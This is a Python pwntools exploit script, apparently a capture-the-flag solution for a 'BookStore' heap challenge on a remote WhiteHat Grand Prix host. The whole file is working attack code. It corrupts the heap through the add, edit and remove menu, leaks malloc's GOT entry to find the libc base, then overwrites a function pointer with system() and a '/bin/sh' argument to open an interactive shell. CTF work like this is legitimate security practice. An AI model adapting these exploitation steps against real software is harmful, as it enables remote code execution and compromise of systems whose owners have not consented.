from pwn import *

def Add(title, size, brief, reference, Selling='N'):
    r.recvuntil('Your choice:')
    r.sendline('1')
    r.recvuntil('Title:')
    r.sendline(title)
    r.recvuntil('Enter brief size:')
    r.sendline(str(size))
    r.recvuntil('Enter brief:')
    r.send(brief)
    r.recvuntil('Reference book title:')
    r.send(reference)
    r.recvuntil('Best Selling? (Y/N)')
    r.sendline(Selling)
    
def Edit(oldtitle, newtilte, size, brief, Selling='N'):
    r.recvuntil('Your choice:')
    r.sendline('2')
    r.recvuntil('Old title:')
    r.send(oldtitle)
    r.recvuntil('New title:')
    r.send(newtilte)
    r.recvuntil('Enter brief size:')
    r.sendline(str(size))
    if size > 0:
        r.recvuntil('Enter brief:')
        r.send(brief)
    r.recvuntil('Best Selling? (Y/N)')
    r.sendline(Selling)
    
def Remove(title):
    r.recvuntil('Your choice:')
    r.sendline('3')
    r.recvuntil('Title:')
    r.sendline(title)
    
def List():
    r.recvuntil('Your choice:')
    r.sendline('4')
   
libc = ELF('./libc-2.27.so')
#r = process('./BookStore_patch')
#raw_input('?')
r = remote('pwn02.grandprix.whitehatvn.com', 8005)

Add('book 1\n', 0xa0, "a"*0xa0, "chung\n", 'Y')

Edit('book 1\n', "a"*0x20, 0x20, "lolz\n")

Remove('a'*0x20)

Add('book 2\n', 0xa0, "lolz\n", "chung\n", 'Y')
Remove('book 2\n')

payload = p64(0x6021E8)
payload = payload.ljust(0xa0, '\x00')
Add('book 3\n', 0x50, "\n", 'chung\n')
Edit('book 3\n', 'book 3\n', 0x40, "\x00"*7+"\n")

Add('book 4\n', 0xa0, payload, 'chung\n') 

Add('book 5\n', 0xa0, payload, 'chung\n')

payload = p64(0)
payload += p64(0) #SELL
payload += p64(0x602200) #LIST
payload += p64(0x6021F0) #next
payload += p64(0x601FD0) #malloc GOT
payload += "x"*0x10 #title
payload += p16(0)
payload += p64(0x400980)
payload += "\x00"*6
payload += "\x90\x03"
payload += p64(0x400980) #strdup
payload = payload.ljust(0xa0, 'a')

Add('book 6\n', 0xa0, payload, 'chung\n')
List()
r.recvuntil('xxxxxxxxxxxxxxxx|')
tmp = r.recv(6)+"\x00"*2
malloc = u64(tmp)
log.info("malloc: %#x" %malloc)
base = malloc - libc.symbols['malloc']
system = base + libc.symbols['system']
log.info("base: %#x" %base)
log.info("system: %#x" %system)

payload = p64(0x6021F0)+p64(0x602240)
payload = payload[:-1]+"\n"

Edit(p64(0x6021F0)+"\n", payload, 0, "")

payload = p64(0) #next
payload += p64(0x602250) #malloc GOT
payload += "/bin/sh\x00" #title
payload += "\x00"*0x18
payload += "\x90\x03"
payload += p64(system) #strdup
Edit("x"*0x10+"\n", "x"*0x10+"\n", len(payload), payload)
payload = p64(0x602240)+p64(0x602240)
payload = payload[:-1]+"\n"

Edit(p64(0x6021F0)+"\n", payload, 0, "")
r.interactive()
